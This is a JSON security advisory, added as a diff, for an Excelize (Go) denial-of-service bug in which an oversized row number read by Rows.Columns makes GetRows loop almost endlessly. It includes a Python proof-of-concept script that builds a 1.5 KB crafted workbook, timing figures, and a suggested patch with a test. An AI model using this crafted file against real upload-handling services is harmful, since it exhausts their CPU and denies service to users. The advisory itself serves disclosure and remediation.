@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-jw42-f3rr-4cc3",
+  "modified": "2026-10-08T17:00:11.817528715Z",
+  "published": "2026-10-08T16:50:13Z",
+  "aliases": [
+    "CVE-2026-107212"
+  ],
+  "summary": "Excelize: Unbounded row number in Rows.Columns makes GetRows and the Rows iterator loop for days",
+  "details": "### Summary\n\nA worksheet whose `\u003crow r=\"...\"\u003e` number is far past Excel's 1,048,576-row limit makes `File.GetRows` and the `Rows` iterator loop once for every missing row. The row limit is checked in `Rows.Next`, but not in `Rows.Columns`, which also reads `\u003crow\u003e` elements. A 1.5 KB file with `\u003crow r=\"231999999999940\"\u003e` after an ordinary first row keeps `GetRows` busy for an estimated 11 days (about 4 ns per missing row), using one CPU core and little memory. Any service that calls `GetRows` or iterates `Rows` on an uploaded workbook can be tied up by a single request.\n\n### Details\n\n`Rows.Next` checks the row number:\n\n```go\nrowNum, _ := attrValToInt(\"r\", xmlElement.Attr)\nif rowNum \u003e TotalRows {\n    rows.err = ErrMaxRows\n    return false\n}\n```\n\nBut `Rows.Columns` reads the cells of the current row by consuming tokens until it reaches the *next* `\u003crow\u003e` element, and it sets `rows.curRow` from that element's `r` without the check (rows.go, around line 179 at 3985c1f):\n\n```go\nif rowNum, rowIterator.err = attrValToInt(\"r\", xmlElement.Attr); rowNum != 0 {\n    rows.curRow = rowNum\n}\n```\n\nAfter that, `rows.curRow` is 231999999999940, and each later `Next()` call takes the `rows.curRow \u003e= rows.seekRow` shortcut and returns `true` without reading any XML. `GetRows` then calls `Next()` and `Columns()` once per row number from 2 to 231999999999940. The check in `Next()` never runs, because the oversized `\u003crow\u003e` element was already consumed by `Columns()`.\n\nIf the oversized row is the *first* row, `Next()` reads it and the existing check works; `TestGetRows` covers only that case. The bug needs a valid row first.\n\n### Proof of concept\n\nThis script uses only the Python standard library and writes a 1.5 KB workbook:\n\n```python\nimport zipfile\nparts = {\n    \"[Content_Types].xml\": '\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003cTypes xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"\u003e\u003cDefault Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/\u003e\u003cDefault Extension=\"xml\" ContentType=\"application/xml\"/\u003e\u003cOverride PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml\"/\u003e\u003cOverride PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/\u003e\u003c/Types\u003e',\n    \"_rels/.rels\": '\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003cRelationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"\u003e\u003cRelationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/\u003e\u003c/Relationships\u003e',\n    \"xl/workbook.xml\": '\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003cworkbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"\u003e\u003csheets\u003e\u003csheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId1\"/\u003e\u003c/sheets\u003e\u003c/workbook\u003e',\n    \"xl/_rels/workbook.xml.rels\": '\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003cRelationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"\u003e\u003cRelationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/\u003e\u003c/Relationships\u003e',\n    \"xl/worksheets/sheet1.xml\": '\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003cworksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"\u003e\u003csheetData\u003e\u003crow r=\"1\"\u003e\u003cc r=\"A1\"\u003e\u003cv\u003e1\u003c/v\u003e\u003c/c\u003e\u003c/row\u003e\u003crow r=\"231999999999940\"\u003e\u003cc r=\"A231999999999940\"\u003e\u003cv\u003e2\u003c/v\u003e\u003c/c\u003e\u003c/row\u003e\u003c/sheetData\u003e\u003c/worksheet\u003e',\n}\nwith zipfile.ZipFile(\"poc.xlsx\", \"w\", zipfile.ZIP_DEFLATED) as z:\n    for name, xml in parts.items():\n        z.writestr(name, xml)\n```\n\n```go\nf, _ := excelize.OpenFile(\"poc.xlsx\")\nrows, err := f.GetRows(\"Sheet1\") // does not return\n```\n\nMeasured on v2.11.0 (linux/amd64), same file shape: a row number of 2,000,000,000 takes 8.3 s, 4,294,967,297 takes 17.5 s, and 231,999,999,999,940 did not finish in 15 minutes. That's linear, so about 11 days. Max RSS stays at about 10 MB.\n\nThe same pattern is in `clusterfuzz-testcase-minimized-POIXSSFFuzzer-5937385319563264.xlsx` in Apache POI's public test data (its sheet8.xml has `\u003crow r=\"231999999999940\"\u003e`). That's how this was found, by running excelize over POI's test files as part of differential testing with xlsx-lean (https://github.com/keithadler/xlsx-lean).\n\n### Suggested patch\n\nApply the same limit in `Columns()`, and have `Next()` stop once an error is recorded. With this change both files above return `ErrMaxRows` immediately. `go test ./...` passes (about 130 s). The new test case hangs without the change and passes in 0.015 s with it.\n\n```diff\n--- a/rows.go\n+++ b/rows.go\n@@ -97,6 +97,9 @@ type Rows struct {\n \n // Next will return true if it finds the next row element.\n func (rows *Rows) Next() bool {\n+\tif rows.err != nil {\n+\t\treturn false\n+\t}\n \trows.seekRow++\n \tif rows.curRow \u003e= rows.seekRow {\n \t\trows.curRowOpts = rows.seekRowOpts\n@@ -176,7 +179,10 @@ func (rows *Rows) Columns(opts ...Options) ([]string, error) {\n \t\t\trowIterator.inElement = xmlElement.Name.Local\n \t\t\tif rowIterator.inElement == \"row\" {\n \t\t\t\trowNum := 0\n-\t\t\t\tif rowNum, rowIterator.err = attrValToInt(\"r\", xmlElement.Attr); rowNum != 0 {\n+\t\t\t\tif rowNum, rowIterator.err = attrValToInt(\"r\", xmlElement.Attr); rowNum \u003e TotalRows {\n+\t\t\t\t\trows.err, rows.token = ErrMaxRows, nil\n+\t\t\t\t\treturn rowIterator.cells, rows.err\n+\t\t\t\t} else if rowNum != 0 {\n \t\t\t\t\trows.curRow = rowNum\n \t\t\t\t} else if rows.token == nil {\n \t\t\t\t\trows.curRow++\n--- a/rows_test.go\n+++ b/rows_test.go\n@@ -28,6 +28,18 @@ func TestGetRows(t *testing.T) {\n \tf.checked = sync.Map{}\n \t_, err = f.GetRows(\"Sheet1\")\n \tassert.Equal(t, ErrMaxRows, err)\n+\t// Test get rows from a file with a row number over the limit after a valid\n+\t// row, which is read by Rows.Columns rather than Rows.Next: this used to\n+\t// iterate once per missing row, about 2.3e14 times here\n+\tf = NewFile()\n+\tf.Pkg.Store(\"xl/worksheets/sheet1.xml\", fmt.Appendf(nil, `\u003cworksheet xmlns=\"%s\"\u003e\u003csheetData\u003e\u003crow r=\"1\"\u003e\u003cc\u003e\u003cv\u003e1\u003c/v\u003e\u003c/c\u003e\u003c/row\u003e\u003crow r=\"231999999999940\"\u003e\u003cc\u003e\u003cv\u003e2\u003c/v\u003e\u003c/c\u003e\u003c/row\u003e\u003c/sheetData\u003e\u003c/worksheet\u003e`, NameSpaceSpreadSheet.Value))\n+\tf.Sheet.Delete(\"xl/worksheets/sheet1.xml\")\n+\tbuf, err := f.WriteToBuffer()\n+\tassert.NoError(t, err)\n+\tf, err = OpenReader(buf)\n+\tassert.NoError(t, err)\n+\t_, err = f.GetRows(\"Sheet1\")\n+\tassert.Equal(t, ErrMaxRows, err)\n }\n \n func TestRows(t *testing.T) {\n```\n\n### Impact\n\nDenial of service (CPU exhaustion) for any application that reads untrusted workbooks with `GetRows` or the `Rows` iterator. No authentication or user interaction is needed beyond the application accepting a file.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/xuri/excelize/v2",
+        "purl": "pkg:golang/github.com/xuri/excelize/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "2.1.0"
+            },
+            {
+              "fixed": "2.11.1-0.20260930021559-01a9ff32fb3c"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-jw42-f3rr-4cc3/GHSA-jw42-f3rr-4cc3.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/qax-os/excelize/security/advisories/GHSA-jw42-f3rr-4cc3"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-107212"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/qax-os/excelize/pull/2438"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/qax-os/excelize/commit/01a9ff32fb3c1f873cf01205e1b8a3285b0e1d23"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/qax-os/excelize"
+    }
+  ]
+}
